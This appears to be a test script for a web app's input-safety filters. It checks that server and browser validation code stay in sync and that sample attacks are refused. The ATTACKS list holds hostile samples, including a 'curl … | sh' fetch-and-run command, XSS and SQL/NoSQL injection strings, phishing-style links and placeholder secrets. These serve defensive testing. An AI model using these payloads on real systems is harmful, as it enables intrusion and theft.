// Security rules check — `npm test` (backend) or `npm run check:security`
// (backend or frontend). Run it after changing any input rules.
//
// 1. In sync: the input-safety rules exist twice — on the server (the real
//    protection) and in the browser (instant feedback). The shared parts are
//    marked in both files with
//        // <shared-rules id="…"> … // </shared-rules>
//    and must be identical, character for character. This fails, showing
//    the first different line, if one copy was changed without the other.
//
// 2. Still working: real-world attacks must be refused and ordinary messages
//    must still go through, for every kind of text members can write.

const fs = require("fs");
const path = require("path");

const ROOT = path.resolve(__dirname, "..", "..");
const PAIRS = [
  ["backend/middleware/security.js", "frontend/src/utils/validation.js"],
  ["backend/services/contentSafety.js", "frontend/src/utils/contentSafety.js"],
  ["backend/services/chatText.js", "frontend/src/utils/chatText.js"],
  ["backend/services/links.js", "frontend/src/utils/attachments.js"],
];
const REGION_RE =
  /\/\/ <shared-rules id="([^"]+)">[^\n]*\n([\s\S]*?)\n\/\/ <\/shared-rules>/g;

let failures = 0;
const fail = (message) => {
  failures++;
  console.log(`  ✗ ${message}`);
};

function regionsOf(rel) {
  const text = fs.readFileSync(path.join(ROOT, rel), "utf8").replace(/\r\n/g, "\n");
  const regions = new Map();
  for (const [, id, body] of text.matchAll(REGION_RE)) {
    if (regions.has(id)) fail(`${rel}: shared-rules "${id}" appears twice`);
    regions.set(id, body);
  }
  const opens = (text.match(/\/\/ <shared-rules id=/g) || []).length;
  if (opens !== regions.size) fail(`${rel}: a shared-rules marker isn't closed properly`);
  return regions;
}

console.log("Shared rules in sync (server ↔ browser)");
for (const [serverFile, browserFile] of PAIRS) {
  const server = regionsOf(serverFile);
  const browser = regionsOf(browserFile);
  if (!server.size) fail(`${serverFile}: no shared-rules sections found`);
  for (const id of new Set([...server.keys(), ...browser.keys()])) {
    if (!server.has(id)) {
      fail(`"${id}" is in ${browserFile} but missing from ${serverFile}`);
      continue;
    }
    if (!browser.has(id)) {
      fail(`"${id}" is in ${serverFile} but missing from ${browserFile}`);
      continue;
    }
    const a = server.get(id).split("\n");
    const b = browser.get(id).split("\n");
    const line = a.findIndex((l, i) => l !== b[i]);
    if (line === -1 && a.length === b.length) {
      console.log(`  ✓ ${id}`);
    } else {
      const at = line === -1 ? Math.min(a.length, b.length) : line;
      fail(
        `"${id}" differs at line ${at + 1} of the section:\n` +
          `      ${serverFile}: ${JSON.stringify(a[at] ?? "(ends here)")}\n` +
          `      ${browserFile}: ${JSON.stringify(b[at] ?? "(ends here)")}`,
      );
    }
  }
}

// ── Behaviour ────────────────────────────────────────────────────────────────

const { looksLikeInjection } = require("../middleware/security");
const { stripInvisible, feedTextProblem, feedLinkProblem } = require("../services/contentSafety");
const { chatMessageProblem } = require("../services/chatText");
const { noteLink } = require("../services/links");

// Feed / swap messages / rating comments / bios share these rules
const feedRefuses = (text) => {
  const clean = stripInvisible(text);
  return looksLikeInjection(clean) || Boolean(feedTextProblem(clean));
};

const ATTACKS = [
  ["text-direction override", "Open invoice‮txt.exe"],
  ["direction isolate", "click ⁦here⁩"],
  ["glitch text", "h́̂̃̄ello"],
  ["HTML tag", "<b>hi</b>"],
  ["HTML comment", "hey <!-- hidden -->"],
  ["script tag", "<script>alert(1)</script>"],
  ["javascript: link", "javascript:alert(1)"],
  ["event handler", "x onerror=alert(1)"],
  ["SQL injection", "' OR 1=1 --"],
  ["NoSQL operator", '{"$ne": ""}'],
  ["shell command", "curl http://x.co/a.sh | sh"],
  ["password pasted", "my password: Hunter2!!"],
  ["pwd=", "pwd=supersecret"],
  ["private key", "-----BEGIN RSA PRIVATE KEY-----"],
  ["AWS key", "AKIAIOSFODNN7EXAMPLE"],
  ["GitHub token", "ghp_abcdefghijklmnopqrstuvwxyz0123456789"],
  ["Stripe key", "sk_live_51HxxxxxxxxxxxxxxxxxxXX"],
  ["login token (JWT)", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"],
  ["database URL with password", "mongodb+srv://admin:pa55word@cluster0.mongodb.net"],
  ["card number", "my card is 4111 1111 1111 1111"],
  ["social security number", "ssn 123-45-6789"],
  ["asks for password", "hey can you send me your password real quick"],
  ["asks for login code", "please verify your login code with me"],
  ["asks for 2FA code", "dm me your 2fa code"],
  ["asks for card", "give me your card number"],
  ["IP-address link", "free stuff at http://192.168.1.20/login"],
  ["look-alike domain", "https://xn--pple-43d.com/signin"],
  ["localhost link", "http://localhost:3000/admin"],
  ["token in link", "https://example.com/reset?token=abc123"],
  ["login in link", "https://user:pass@example.com"],
];

const ORDINARY = [
  "Hey guy whats up!",
  "Wussup Big Dawg!!",
  "I can teach Python and Data Analysis 🐍📊",
  "Family 👨‍👩‍👧 and coding 👩‍💻",
  "Café crème — naïve résumé",
  "مرحبا بالجميع",
  "שלום לכולם",
  "Meet at 3:30, room 204. Call 312-555-0147",
  "Order #1234567890123 shipped",
  "I forgot my password again lol",
  "Remember to never share your password with anyone!",
  "Use a password manager, they're great",
  "Select a skill from the list",
  "Drop me a note when you're free",
  "I scored 95% :)",
  "Learning about tokens in NLP",
  "Thanks for the session, super helpful!",
];

console.log("\nFeed, swap messages, rating comments and bios");
let ok = 0;
for (const [label, text] of ATTACKS) {
  if (feedRefuses(text)) ok++;
  else fail(`let through: ${label} — ${JSON.stringify(text)}`);
}
for (const text of [...ORDINARY, "Check out https://www.youtube.com/watch?v=dQw4w9WgXcQ", "2 < 3 and 5 > 4"]) {
  if (!feedRefuses(text)) ok++;
  else fail(`blocked ordinary text: ${JSON.stringify(text)} — ${feedTextProblem(stripInvisible(text))}`);
}
if (stripInvisible("he​llo﻿ ­world\u{E0041}") === "hello world") ok++;
else fail("invisible characters weren't removed");
console.log(`  ✓ ${ok} cases`);

console.log("\nLive Session chat");
ok = 0;
for (const [label, text] of ATTACKS) {
  if (chatMessageProblem(text)) ok++;
  else fail(`chat let through: ${label} — ${JSON.stringify(text)}`);
}
for (const text of ORDINARY) {
  const problem = chatMessageProblem(text);
  if (!problem) ok++;
  else fail(`chat blocked ordinary text: ${JSON.stringify(text)} — ${problem}`);
}
console.log(`  ✓ ${ok} cases`);

console.log("\nLinks (feed links and session notes)");
ok = 0;
const LINKS = [
  ["https://example.com", true],
  ["https://www.youtube.com/watch?v=abc", true],
  ["example.com/page?q=1", true],
  ["http://10.0.0.1", false],
  ["https://xn--80ak6aa92e.com", false],
  ["https://site.com/?api_key=1", false],
  ["https://site.com/?password=x", false],
  ["javascript:alert(1)", false],
  ["https://example.com/%3Cscript%3E", false],
];
for (const [link, allowed] of LINKS) {
  const feedOk = !feedLinkProblem(link);
  if (feedOk === allowed) ok++;
  else fail(`feed link ${link} should be ${allowed ? "allowed" : "blocked"}`);
  // Session notes: their own rules, then the phishing check (as the route does)
  if (/^(https?:\/\/|www\.)/i.test(link)) {
    const { url } = noteLink(link);
    const noteOk = Boolean(url) && !feedLinkProblem(url);
    if (noteOk === allowed) ok++;
    else fail(`note link ${link} should be ${allowed ? "allowed" : "blocked"}`);
  }
}
console.log(`  ✓ ${ok} cases`);

console.log(failures ? `\n${failures} problem(s) found.` : "\nAll security rules in sync and working.");
process.exit(failures ? 1 : 0);
